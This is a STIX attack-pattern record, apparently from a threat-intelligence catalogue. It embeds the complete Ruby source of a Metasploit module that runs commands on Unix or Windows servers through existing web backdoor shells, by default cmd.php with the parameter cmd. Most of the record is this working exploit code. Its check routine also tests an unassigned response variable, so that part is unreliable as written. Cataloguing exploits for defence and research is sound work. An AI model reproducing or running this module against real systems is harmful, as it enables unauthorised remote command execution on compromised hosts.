{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--972b9a2e-5520-4452-a6b6-27227d0d69a3",
    "created": "2024-08-14T17:07:52.205187Z",
    "modified": "2024-08-14T17:07:52.205192Z",
    "name": "Simple Backdoor Shell Remote Code Execution",
    "description": " This module exploits unauthenticated simple web backdoor shells by leveraging the common backdoor shell's vulnerable parameter  to execute commands. The SecLists project of Daniel Miessler and Jason Haddix has a lot of samples for these kind of backdoor shells which is categorized under Payloads.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/simple_backdoors_exec.rb",
            "external_id": "simple_backdoors_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://resources.infosecinstitute.com/checking-out-backdoor-shells/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/danielmiessler/SecLists/tree/master/Payloads#MostPHPWebBackdoorsListed"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Simple Backdoor Shell Remote Code Execution',\n      'Description'    => %q{\n        This module exploits unauthenticated simple web backdoor shells by leveraging the\n        common backdoor shell's vulnerable parameter  to execute commands. The SecLists project of\n        Daniel Miessler and Jason Haddix has a lot of samples for these kind of backdoor shells\n        which is categorized under Payloads.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jay Turla <@shipcod3>',\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://resources.infosecinstitute.com/checking-out-backdoor-shells/' ],\n          [ 'URL', 'https://github.com/danielmiessler/SecLists/tree/master/Payloads' ] # Most PHP Web Backdoors Listed\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'Platform'       => %w{ unix win },\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['backdoor / Unix', { 'Platform' => 'unix' } ],\n          ['backdoor / Windows', { 'Platform' => 'win' } ]\n        ],\n      'DisclosureDate' => '2015-09-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path of a backdoor shell', 'cmd.php']),\n        OptString.new('VAR', [true, 'The command variable', 'cmd']),\n        OptEnum.new('METHOD', [true, 'HTTP Method', 'GET', ['GET', 'POST', 'PUT']])\n      ])\n  end\n\n  def check\n    test = Rex::Text.rand_text_alpha(8)\n    http_send_command(test)\n    if res && res.body =~ /#{test}/\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def http_send_command(cmd)\n    res = send_request_cgi({\n      'method'   => datastore['METHOD'],\n      'uri'      => normalize_uri(target_uri.path),\n      'vars_get' => {\n        datastore['VAR'] => cmd\n      }\n    })\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"Failed to execute the command.\")\n    end\n    res\n  end\n\n  def exploit\n    http_send_command(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-08",
    "x_mitre_platforms": [
        "%w{ unix win }"
    ]
}